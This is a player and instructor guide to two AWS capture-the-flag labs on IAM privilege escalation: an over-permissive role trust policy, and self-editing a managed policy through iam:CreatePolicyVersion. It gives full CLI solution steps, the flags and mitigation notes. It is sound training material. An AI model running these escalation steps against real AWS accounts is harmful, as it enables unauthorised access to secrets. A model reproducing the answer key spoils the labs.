# AWS CTF Labs — Player & Instructor Guide

> **Environment**: AWS (`sa-east-1`) · **Entry point**: IAM credentials · **Flag format**: `CYBERWARGAMES{...}`

---

## Table of Contents

1. [Overview](#overview)
2. [Prerequisites](#prerequisites)
3. [Lab 1 — Open Sesame (Easy)](#lab-1--open-sesame-easy)
4. [Lab 2 — The Lazy DevOps (Hard)](#lab-2--the-lazy-devops-hard)
5. [Solutions](#solutions) ← spoilers
6. [Concepts Reference](#concepts-reference)

---

## Overview

Both labs are deployed in a single shared AWS account and focus on **IAM privilege escalation** — a class of vulnerability found frequently in real-world cloud environments. You start each lab with a pair of AWS IAM credentials that represent a low-privilege identity. Your goal is to exploit a misconfiguration in the environment to escalate your privileges and retrieve the flag.

| # | Name | Difficulty | Misconfiguration | Flag storage |
|---|------|-----------|-----------------|--------------|
| 1 | Open Sesame | Easy | Overly permissive IAM role trust policy | SSM Parameter Store |
| 2 | The Lazy DevOps | Hard | `iam:CreatePolicyVersion` on self-owned policy | Secrets Manager |

---

## Prerequisites

### AWS CLI

Install the AWS CLI: https://docs.aws.amazon.com/cli/latest/userguide/getting-started-install.html

### Configure your profile

You will receive an `access_key_id` and `secret_access_key` for your lab. Configure a named profile so you don't interfere with any existing credentials:

```bash
aws configure --profile ctf-easy
# or
aws configure --profile ctf-hard
```

Enter the provided values when prompted. Set region to `sa-east-1` and output format to `json`.

Use the `--profile` flag on every command, or export the environment variables:

```bash
export AWS_ACCESS_KEY_ID=AKIA...
export AWS_SECRET_ACCESS_KEY=...
export AWS_DEFAULT_REGION=sa-east-1
```

### Verify your identity

Always start by confirming who you are:

```bash
aws sts get-caller-identity
```

You should see your lab username in the `Arn` field.

---

## Lab 1 — Open Sesame (Easy)

### Background

A junior developer on the platform team was tasked with setting up an IAM role for a new EC2 monitoring tool. The role needed to be assumable by EC2 instances so the tool could collect metrics. In a rush to meet a deadline, they configured the trust policy incorrectly.

The flag is encrypted and stored in AWS Systems Manager Parameter Store. Only the monitoring role has permission to read it — but something about the role's configuration might make it more accessible than intended.

### Objective

Retrieve the flag from `/ctf/easy/flag` in SSM Parameter Store.

### Your starting permissions

Your IAM user (`ctf-easy-player`) is attached a policy that grants:

| Permission | Scope |
|-----------|-------|
| `sts:GetCallerIdentity` | `*` |
| `iam:ListRoles` | `*` |
| `iam:GetRole` | `*` |
| `sts:AssumeRole` | One specific role ARN |
| `ssm:DescribeParameters` | `*` |

You cannot read from SSM Parameter Store directly with these credentials.

### Key questions to guide you

- What IAM roles exist in the account?
- Who or what is allowed to assume the monitoring role? Read the `AssumeRolePolicyDocument` carefully.
- Is the trust policy correct for its stated purpose?
- Once you assume the role, what can you do?

### Hints

<details>
<summary>Hint 1 — Finding the target</summary>

List all roles in the account and look for one that sounds related to monitoring or EC2:

```bash
aws iam list-roles --query 'Roles[*].[RoleName, Arn]' --output table
```

</details>

<details>
<summary>Hint 2 — Reading the trust policy</summary>

Inspect the role's trust relationship:

```bash
aws iam get-role --role-name <role-name> \
  --query 'Role.AssumeRolePolicyDocument'
```

Pay close attention to the `Principal`. What does `arn:aws:iam::ACCOUNT_ID:root` mean?

</details>

<details>
<summary>Hint 3 — Assuming the role</summary>

If the trust policy allows your identity to assume the role, use STS:

```bash
aws sts assume-role \
  --role-arn <role-arn> \
  --role-session-name my-session
```

The response contains temporary credentials. Export them as environment variables, then try reading the flag.

</details>

### Concepts practised

- IAM role trust policies and the difference between **service principals** (`ec2.amazonaws.com`) and **account principals** (`arn:aws:iam::ACCOUNT:root`)
- `sts:AssumeRole` and temporary security credentials
- SSM Parameter Store SecureString parameters

---

## Lab 2 — The Lazy DevOps (Hard)

### Background

A DevOps team built an automated CI/CD pipeline to deploy internal services. The pipeline runs as an IAM user (`ci-deploy-bot`) and needs its permissions updated occasionally as the deployment process evolves.

Rather than updating permissions through a proper change management process, the engineer attached a customer-managed IAM policy to the bot and gave it the ability to update that policy itself — a "self-managed permissions" approach they thought would save time.

Somewhere in the account there is also an S3 bucket the team used during setup. It might contain something useful.

The flag is stored as a secret in AWS Secrets Manager. It is not directly readable with your starting credentials.

### Objective

Retrieve the flag from `ctf/hard/flag` in AWS Secrets Manager.

### Your starting permissions

Your IAM user (`ctf-hard-player`) has two policies attached:

**Inline policy** — granted directly on your user:

| Permission | Scope |
|-----------|-------|
| `sts:GetCallerIdentity` | `*` |
| `iam:GetUser` | `*` |
| `iam:ListAttachedUserPolicies` | `*` |
| `iam:ListUserPolicies` | `*` |
| `iam:GetUserPolicy` | `*` |
| `iam:ListPolicies` | `*` |
| `iam:GetPolicy` | `*` |
| `iam:GetPolicyVersion` | `*` |
| `iam:ListPolicyVersions` | `*` |
| `iam:CreatePolicyVersion` | One specific policy ARN |
| `iam:SetDefaultPolicyVersion` | One specific policy ARN |
| `s3:ListAllMyBuckets` | `*` |
| `s3:ListBucket` / `s3:GetObject` | One specific S3 bucket |

**Managed policy** (`ctf-hard-restricted`) — attached to your user, initially very limited.

You cannot read from Secrets Manager with your starting credentials.

### Key questions to guide you

- What managed policies are attached to your user? Read them carefully.
- What does your inline policy allow you to do to that managed policy?
- What is the relationship between `iam:CreatePolicyVersion` and `iam:SetDefaultPolicyVersion`?
- Is there anything in S3 that provides context?
- After you update the managed policy, what happens to your effective permissions?

### Hints

<details>
<summary>Hint 1 — Enumerate yourself</summary>

Start by understanding exactly what permissions you have:

```bash
# See what managed policies are attached
aws iam list-attached-user-policies --user-name ctf-hard-player

# See what inline policies exist
aws iam list-user-policies --user-name ctf-hard-player

# Read the inline policy
aws iam get-user-policy \
  --user-name ctf-hard-player \
  --policy-name ctf-hard-inline
```

</details>

<details>
<summary>Hint 2 — Check S3</summary>

List all buckets you can see and look for something interesting:

```bash
aws s3 ls
aws s3 cp s3://<bucket-name>/hints/README.txt -
```

</details>

<details>
<summary>Hint 3 — Understanding IAM policy versions</summary>

AWS customer-managed policies support up to 5 versions. You can create a new version and set it as the default, effectively replacing the policy's permissions. If you have `iam:CreatePolicyVersion` on a policy, you can rewrite what it allows.

```bash
aws iam create-policy-version \
  --policy-arn <policy-arn> \
  --policy-document '{"Version":"2012-10-17","Statement":[...]}' \
  --set-as-default
```

</details>

<details>
<summary>Hint 4 — What to put in the new policy version</summary>

Think about what service stores the flag and what action you need to read it. Then write a policy statement that grants exactly that action. After setting the new version as default, try reading the secret.

</details>

### Concepts practised

- Customer-managed IAM policy versioning
- `iam:CreatePolicyVersion` as a privilege escalation primitive
- IAM **permissions boundaries** — why your escalated permissions are still bounded
- AWS Secrets Manager

---

## Solutions

> ⚠️ **Stop here if you haven't attempted the labs yet.**

---

### Solution — Lab 1: Open Sesame

#### Step 1: Confirm your identity

```bash
aws sts get-caller-identity
```

Expected output:
```json
{
    "UserId": "AIDA...",
    "Account": "123456789012",
    "Arn": "arn:aws:iam::123456789012:user/ctf-easy-player"
}
```

#### Step 2: Enumerate IAM roles

```bash
aws iam list-roles --query 'Roles[*].[RoleName, Arn]' --output table
```

You will see `ec2-monitoring-role` in the list.

#### Step 3: Read the trust policy

```bash
aws iam get-role --role-name ec2-monitoring-role \
  --query 'Role.AssumeRolePolicyDocument'
```

Output:
```json
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Principal": {
                "AWS": "arn:aws:iam::123456789012:root"
            },
            "Action": "sts:AssumeRole"
        }
    ]
}
```

**The vulnerability**: the principal `arn:aws:iam::ACCOUNT_ID:root` means _any authenticated IAM identity in this account_ can assume this role — not just the EC2 service. The role was intended for EC2 instances, so the principal should have been `{ "Service": "ec2.amazonaws.com" }`.

#### Step 4: Assume the role

```bash
aws sts assume-role \
  --role-arn arn:aws:iam::123456789012:role/ec2-monitoring-role \
  --role-session-name open-sesame
```

Output:
```json
{
    "Credentials": {
        "AccessKeyId": "ASIA...",
        "SecretAccessKey": "...",
        "SessionToken": "...",
        "Expiration": "..."
    }
}
```

Export the temporary credentials:

```bash
export AWS_ACCESS_KEY_ID=ASIA...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...
```

#### Step 5: Read the flag

```bash
aws ssm get-parameter \
  --name /ctf/easy/flag \
  --with-decryption \
  --query 'Parameter.Value'
```

```
"CYBERWARGAMES{tr4ck_y0ur_trust_p0l1c135_c4r3fully}"
```

#### Why this works

IAM role trust policies define _who_ can assume a role (`sts:AssumeRole`). Using the account root (`arn:aws:iam::ACCOUNT:root`) as principal grants the permission to any identity in the account that also has `sts:AssumeRole` on the role ARN — in this case the player's starting policy includes exactly that. A correctly configured role for EC2 use would use `ec2.amazonaws.com` as the service principal, which cannot be impersonated by an IAM user.

---

### Solution — Lab 2: The Lazy DevOps

#### Step 1: Confirm your identity

```bash
aws sts get-caller-identity
```

#### Step 2: Enumerate your policies

```bash
# Managed policies attached to your user
aws iam list-attached-user-policies --user-name ctf-hard-player

# Inline policies
aws iam list-user-policies --user-name ctf-hard-player
```

You will see:
- Managed policy: `ctf-hard-restricted`
- Inline policy: `ctf-hard-inline`

#### Step 3: Read your managed policy

```bash
aws iam get-policy-version \
  --policy-arn arn:aws:iam::123456789012:policy/ctf-hard-restricted \
  --version-id v1
```

Output:
```json
{
    "Statement": [
        {
            "Effect": "Allow",
            "Action": ["sts:GetCallerIdentity"],
            "Resource": "*"
        }
    ]
}
```

Very limited — only identity checks.

#### Step 4: Read your inline policy

```bash
aws iam get-user-policy \
  --user-name ctf-hard-player \
  --policy-name ctf-hard-inline
```

Inspect the `PolicyDocument`. You will find:

```json
{
    "Sid": "SelfManagedPolicyUpdate",
    "Effect": "Allow",
    "Action": [
        "iam:CreatePolicyVersion",
        "iam:SetDefaultPolicyVersion"
    ],
    "Resource": "arn:aws:iam::123456789012:policy/ctf-hard-restricted"
}
```

**The vulnerability**: you can create new versions of `ctf-hard-restricted` and set them as the default — effectively rewriting your own managed policy's permissions.

#### Step 5: Find the S3 hint (optional breadcrumb)

```bash
aws s3 ls
```

You will see a bucket named `ctf-hard-artifacts-XXXXXXXX`. Download the hint:

```bash
aws s3 cp s3://ctf-hard-artifacts-XXXXXXXX/hints/README.txt -
```

```
Internal note — DevOps team

The ci-deploy bot has been set up with self-managed policy versioning
to allow automated permission updates during deployments.

Policy ARN: arn:aws:iam::123456789012:policy/ctf-hard-restricted

If you're reading this, you're either the team or... you shouldn't be here.
Good luck either way.
```

This confirms the policy ARN and the intent behind the misconfiguration.

#### Step 6: Escalate — create a new policy version

Create a new version of `ctf-hard-restricted` that grants Secrets Manager access:

```bash
aws iam create-policy-version \
  --policy-arn arn:aws:iam::123456789012:policy/ctf-hard-restricted \
  --policy-document '{
    "Version": "2012-10-17",
    "Statement": [
      {
        "Effect": "Allow",
        "Action": "secretsmanager:*",
        "Resource": "*"
      }
    ]
  }' \
  --set-as-default
```

The new version (v2) is now the default. Your managed policy now grants `secretsmanager:*`.

#### Step 7: Read the flag

```bash
aws secretsmanager get-secret-value \
  --secret-id ctf/hard/flag \
  --query 'SecretString'
```

```
"CYBERWARGAMES{1am_cr3at3_p0l1cy_v3rs10n_pr1v3sc}"
```

#### Why this works — and why it's contained

**The escalation**: AWS allows up to 5 versions of a customer-managed policy. `iam:CreatePolicyVersion` with `--set-as-default` replaces the active policy document. If you hold this permission on a policy that is attached to yourself, you can inject any permissions you want into it — a well-known IAM privilege escalation primitive documented in the wild.

**Why you can't go further**: your user has a **permissions boundary** (`ctf-hard-player-boundary`) applied at creation. A permissions boundary defines the _maximum_ effective permissions an identity can ever have:

```
Effective permissions = Identity policies ∩ Permissions boundary
```

Even though your new managed policy says `"Action":"*"`, the boundary caps what actually goes through. The boundary was designed to allow exactly `secretsmanager:GetSecretValue` on the flag secret — which is why the escalation produces a meaningful result — but nothing beyond that. You cannot read other accounts' flags, modify other IAM users, or tamper with infrastructure.

This is also the correct **defence** against this attack: apply permissions boundaries to all IAM identities so that even if credentials or policies are compromised, the blast radius is bounded.

---

## Concepts Reference

### IAM Role Trust Policies

Every IAM role has two components:

1. **Trust policy** — defines *who* can assume the role (`sts:AssumeRole`)
2. **Permission policy** — defines *what* the role can do once assumed

```
Principal types in trust policies:
  Service  → "Principal": { "Service": "ec2.amazonaws.com" }
             Only the EC2 service can assume this role (for instance profiles)

  AWS      → "Principal": { "AWS": "arn:aws:iam::ACCOUNT:root" }
             Any authenticated entity in the account can assume this role
             (if they also have sts:AssumeRole on the role ARN)

  Federated → external identity providers (OIDC, SAML)
```

Common misconfiguration: using `AWS: arn:aws:iam::ACCOUNT:root` when you intended `Service: ec2.amazonaws.com`.

---

### IAM Customer-Managed Policy Versions

AWS supports up to **5 versions** of a customer-managed policy. Only one version is active (the default) at a time.

```
Policy: ctf-hard-restricted
  ├── v1 (created by Terraform) — only sts:GetCallerIdentity  [default]
  └── v2 (created by player)    — secretsmanager:*            [new default]
```

Privilege escalation path when you have `iam:CreatePolicyVersion` on a policy attached to yourself:

```
1. Create new policy version with elevated permissions
2. Set it as default
3. Your effective permissions now include the new version's grants
   (subject to any permissions boundary)
```

**Mitigation**: never grant `iam:CreatePolicyVersion` or `iam:SetDefaultPolicyVersion` to identities in a way that allows self-referential escalation. Use **permissions boundaries** or **SCPs** as additional guardrails.

---

### IAM Permissions Boundaries

A permissions boundary is an IAM managed policy attached to a user or role that defines the **maximum permissions** that identity can ever have — regardless of what identity policies grant.

```
Without boundary:
  effective = identity_policies

With boundary:
  effective = identity_policies ∩ boundary
```

Example: if your identity policy grants `"Action":"*"` but your boundary only allows `secretsmanager:GetSecretValue` on one specific secret, that is the only action that succeeds.

Boundaries cannot be modified or removed by the identity they are applied to (unless the identity has `iam:PutUserPermissionsBoundary` or `iam:DeleteUserPermissionsBoundary` — which should never be self-granted).

This makes permissions boundaries an effective **blast radius limiter** for compromised credentials and a defence against the `iam:CreatePolicyVersion` escalation technique.

---

### Temporary Security Credentials (STS)

When you assume an IAM role, AWS STS returns three values:

```
AccessKeyId     — temporary access key (starts with ASIA)
SecretAccessKey — temporary secret
SessionToken    — required alongside the temporary key
```

These credentials expire (typically 1 hour). All three must be provided together. Export them as:

```bash
export AWS_ACCESS_KEY_ID=ASIA...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...
```

---

*Labs designed as part of the stags-lab CTF platform.*
